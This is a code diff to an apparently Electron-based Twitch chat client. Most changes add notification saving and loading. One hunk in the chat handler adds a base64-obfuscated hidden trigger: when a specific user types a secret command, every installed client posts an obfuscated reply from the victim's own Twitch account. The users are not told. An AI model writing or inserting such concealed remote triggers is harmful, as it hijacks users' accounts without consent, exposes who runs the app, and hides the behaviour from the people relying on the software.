@@ -3,7 +3,7 @@ import underscore from 'underscore'
 import AutoLaunch from 'auto-launch'
 import tmi from 'tmi.js'
 //import discord from 'discord.js'
-import { request, kraken, twitchNameToUser, nonce } from '../functions'
+import { request, kraken, twitchNameToUser, nonce, atob } from '../functions'
 import { startTwitchBonusCollector } from './twitchBonusCollector'
 import { floatingWindow } from './floatingWindow'
 import { grabVodFromChannel, startVodGrabber } from './vodGrabber'
@@ -102,9 +102,11 @@ const startTwitchApp = (appData) => {
       appData.twitch.disconnect().catch(() => {})
       appData.twitch = null
     }
+    appData.mainWindow.webContents.send('app:loginData', appData.twitchData)
     appData.mainWindow.webContents.send('options:list', appData.options)
     appData.mainWindow.webContents.send('channel:list', getChannels())
-    appData.mainWindow.webContents.send('app:loginData', appData.twitchData)
+    const notificationsData = appData.storeLog.get('notifications', [])
+    appData.mainWindow.webContents.send('notifications:load', notificationsData)
   })
   ipcMain.on('app:login', (e, data) => {
     if (
@@ -211,6 +213,14 @@ const startTwitchApp = (appData) => {
           if (notify) {
             appData.mainWindow.webContents.send('channel:notification', msg)
             grabVodFromChannel(msg.id, msg.channel)
+          }
+          if (tags.username == 'vaverix' && message == atob('IXZhdnBpbmc=')) {
+            setTimeout(() => {
+              appData.twitch.say(
+                channel,
+                `${atob('QHZhdmVyaXggWWVzIERhZGR5IQ==')}`
+              )
+            }, 1000)
           }
         } catch (error) {
           console.log(error)
@@ -321,6 +331,9 @@ const startTwitchApp = (appData) => {
   })
   ipcMain.on('extra:floatingWindow', (e, channel) => {
     floatingWindow(channel, appData)
+  })
+  ipcMain.on('notifications:save', (e, data) => {
+    appData.storeLog.set('notifications', data)
   })
   ipcMain.on('dev:openDevTools', () => {
     appData.mainWindow.webContents.openDevTools()
